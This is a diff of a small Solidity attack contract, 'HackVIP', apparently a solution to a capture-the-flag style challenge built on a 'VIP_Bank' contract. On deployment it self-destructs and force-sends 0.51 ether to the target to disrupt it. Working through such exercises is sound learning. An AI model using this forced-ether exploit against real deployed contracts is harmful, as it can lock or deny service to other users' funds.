@@ -3,8 +3,13 @@ pragma solidity ^0.8.7;
 import "./VIP_Bank.sol";
 
 contract HackVIP {
-    constructor(address _target) payable {
-        VIP_Bank(_target).deposit();
-
+    // send some value to the payable constructor
+    // 0.51 ether
+    constructor(address payable _target) payable {
+        // upon this contract deployment
+        // destruct this contract immediatly after deployment
+        // send the value to the _target address (payable)
+        selfdestruct(_target);
+        
     }
 }
